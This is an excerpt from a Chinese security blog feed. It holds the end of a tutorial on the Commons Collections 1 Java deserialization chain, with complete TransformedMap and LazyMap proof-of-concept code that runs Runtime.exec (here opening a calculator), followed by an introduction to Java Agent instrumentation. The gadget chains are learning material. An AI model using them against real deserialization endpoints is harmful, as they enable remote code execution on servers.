Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h3 id="3-4-TransformedMap"><a href="#3-4-TransformedMap" class="headerlink" title="3.4 TransformedMap"></a>3.4 TransformedMap</h3><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p>
<p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PocMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">        <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">        Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">        <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">        <span class="comment">//outerMap_now.put(&quot;123&quot;, &quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="4-LazyMap版本"><a href="#4-LazyMap版本" class="headerlink" title="4. LazyMap版本"></a>4. LazyMap版本</h2><p>jdk 8u72一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoclazyMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;ddddddd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>对poc进行了简单分析，分别使用了TransformedMap版和lazyMpa进行了复现</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ul>
<li> <a href="https://shadowflow123.github.io/2021/12/15/Commons-Collections-1">https://shadowflow123.github.io/2021/12/15/Commons-Collections-1</a></li>
</ul>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Agent</title>
    <url>/Java-Agent/</url>
    <content><![CDATA[<blockquote>
<p>春水碧于天，画船听雨眠。</p>
</blockquote>
<p>Java Agent学习</p>
<span id="more"></span>

<h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><h3 id="JVMTI"><a href="#JVMTI" class="headerlink" title="JVMTI"></a>JVMTI</h3><p>JVMTI(JVM Tool Interface)是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。</p>
<h3 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h3><p><code>JDK1.5</code>开始，<code>Java</code>新增了<code>Instrumentation(Java Agent API)</code>和<code>JVMTI(JVM Tool Interface)</code>功能，允许<code>JVM</code>在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的<code>class(类字节码)</code>进行重新加载(<code>Retransform</code>)。</p>
<p>利用<code>Java Agent</code>这一特性衍生出了<code>APM(Application Performance Management，应用性能管理)</code>、<code>RASP(Runtime application self-protection，运行时应用自我保护)</code>、<code>IAST(Interactive Application Security Testing，交互式应用程序安全测试)</code>等相关产品，它们都无一例外的使用了<code>Instrumentation/JVMTI</code>的<code>API</code>来实现动态修改<code>Java类字节码</code>并插入监控或检测代码。</p>
<p><strong><code>Java Agent</code>有两种运行模式：</strong></p>
<ol>
<li>启动<code>Java程序</code>时添加<code>-javaagent(Instrumentation API实现方式)</code>或<code>-agentpath/-agentlib(JVMTI的实现方式)</code>参数，如<code>java -javaagent:/data/XXX.jar LingXeTest</code>。</li>
<li><code>JDK1.6</code>新增了<code>attach(附加方式)</code>方式，可以对运行中的<code>Java进程</code>附加<code>Agent</code>。</li>
</ol>
<p>这两种运行方式的最大区别在于第一种方式只能在程序启动时指定<code>Agent</code>文件，而<code>attach</code>方式可以在<code>Java程序</code>运行后根据<code>进程ID</code>动态注入<code>Agent</code>到<code>JVM</code>。</p>
<h2 id="2-Java-Agent"><a href="#2-Java-Agent" class="headerlink" title="2. Java Agent"></a>2. Java Agent</h2><p>Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了<code>main</code>方法为程序入口，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的，如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="function"><span class="title">premain</span>(<span class="params"><span class="built_in">String</span> args, Instrumentation inst</span>)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="function"><span class="title">agentmain</span>(<span class="params"><span class="built_in">String</span> args, Instrumentation inst</span>)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>Java Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（Agent模式）或<code>Agent-Class:</code>（Agent模式）配置，如：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Premain-Class: com<span class="selector-class">.anbai</span><span class="selector-class">.sec</span><span class="selector-class">.agent</span><span class="selector-class">.CrackLicenseAgent</span></span><br><span class="line">Agent-Class: com<span class="selector-class">.anbai</span><span class="selector-class">.sec</span><span class="selector-class">.agent</span>.CrackLicenseAgent</span><br></pre></td></tr></table></figure>

<p>如果我们需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</p>
<h3 id="javaagent参数"><a href="#javaagent参数" class="headerlink" title="javaagent参数"></a>javaagent参数</h3><p>Javaagent是java命令的一个参数。参数Javaagent可以用于指定一个Jar包，并且对该java包有两个要求：</p>
<ol>
<li>这个jar包的MANIFEST.MF文件必须指定Premain-Class 项</li>
<li>Premain-Class指定的那个类必须实现premain()方法。</li>
</ol>
<p>premain方法，从字面上理解，就是运行在main函数之前的方法。当java虚拟机启动的时候，在执行main函数之前，JVM先运行-javaagent所指定jar包内Premain-Class这个类的premain方法。</p>
<p>在命令行输入Java可以看到相应的参数，其中有和java agent相关的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-agentlib:&lt;libname&gt;[=&lt;选项&gt;]</span><br><span class="line">                  加载本机代理库 &lt;libname&gt;, 例如 -agentlib:hprof</span><br><span class="line">                  另请参阅 -agentlib:jdwp=help 和 -agentlib:hprof=help</span><br><span class="line">    -agentpath:&lt;pathname&gt;[=&lt;选项&gt;]</span><br><span class="line">                  按完整路径名加载本机代理库</span><br><span class="line">    -javaagent:&lt;jarpath&gt;[=&lt;选项&gt;]</span><br><span class="line">                  加载 Java 编程语言代理, 请参阅 java.lang.instrument</span><br></pre></td></tr></table></figure>

<p>在上面参数中提到的参阅<code>java.lang.instrument</code>,这是rt.jar中定义的一个包，该路径有两个重要的类类。</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ClassFileTransformer</span></span><br><span class="line"><span class="attribute">Instrumentation</span></span><br></pre></td></tr></table></figure>

<p>该包提供了一些工具帮助开发人员在 Java 程序运行时，动态修改系统中的 Class 类型。javaagent的功能更像是一个Class类型的转换器，他可以在运行时接收重新外部请求，对Class类型进行修改。</p>
<p>从本质上将，Java Agent是一个遵守一组严格约定的常规java类。上面说到javaagent命令要求指定类中必须有premain()方法，并且对premain方法的签名也有要求，签名必须满足以下两种格式</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(<span class="keyword">String</span> agentArgs, Instrumentation inst)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(<span class="keyword">String</span> agentArgs)</span></span></span><br></pre></td></tr></table></figure>

<p>JVM会优先加载带Instrumentation签名的方法，成功加载忽略第二种，如果第一种没有，则加载第二种方法。这个逻辑在sun.instrument.InstrumentationImpl类的loadClassAndStartAgent方法中。</p>
<h3 id="Instrumentation定义"><a href="#Instrumentation定义" class="headerlink" title="Instrumentation定义"></a>Instrumentation定义</h3><p>位置：<code>java/lang/instrument/Instrumentation.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="keyword">boolean</span> canRetransform)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-JVM启动前静态Instrument"><a href="#3-JVM启动前静态Instrument" class="headerlink" title="3. JVM启动前静态Instrument"></a>3. JVM启动前静态Instrument</h2><h3 id="3-1-实现一个Demo"><a href="#3-1-实现一个Demo" class="headerlink" title="3.1 实现一个Demo"></a>3.1 实现一个Demo</h3><p><strong>1）创建一个类包含premain方法:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreMainTraceAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;两个参数的java agent premain&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面我们实现的这个类，实现了带有Instrumentation参数的premain方法。调用addTransformer()方法对启动时所有类进行拦截        </p>
<p><strong>2） 打包agent：</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.1</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">            &lt;configuration&gt;</span><br><span class="line">                &lt;archive&gt;</span><br><span class="line">                    &lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br><span class="line">                    &lt;manifest&gt;</span><br><span class="line">                        &lt;addClasspath&gt;<span class="keyword">true</span>&lt;/addClasspath&gt;</span><br><span class="line">                    &lt;/manifest&gt;</span><br><span class="line">                    &lt;manifestEntries&gt;</span><br><span class="line">                        &lt;Premain-Class&gt;com.shadowflow.learn.PreMainTraceAgent&lt;/Premain-Class&gt;</span><br><span class="line">                        &lt;Agent-Class&gt;com.shadowflow.learn.PreMainTraceAgent&lt;/Agent-Class&gt;</span><br><span class="line">                        &lt;Can-Redefine-Classes&gt;<span class="keyword">true</span>&lt;/Can-Redefine-Classes&gt;</span><br><span class="line">                        &lt;Can-Retransform-Classes&gt;<span class="keyword">true</span>&lt;/Can-Retransform-Classes&gt;</span><br><span class="line">                    &lt;/manifestEntries&gt;</span><br><span class="line">                &lt;/archive&gt;</span><br><span class="line">            &lt;/configuration&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3）打包：</strong></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mvn</span> clean install</span><br></pre></td></tr></table></figure>

<p><strong>4）编写待插桩类：</strong></p>
<p>新建一个工程,创建两个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main start&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----&quot;</span>+<span class="keyword">new</span> Dog().say());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;am a dog!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>maven</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.shadowflow.test.TestMain<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样打包</p>
<p><strong>5）执行：</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -javaagent:./javaagent-demo-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar -jar test-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">两个参数的java agent premain</span><br><span class="line">main <span class="built_in">start</span></span><br><span class="line"><span class="comment">-----I&#x27;am a dog!</span></span><br></pre></td></tr></table></figure>



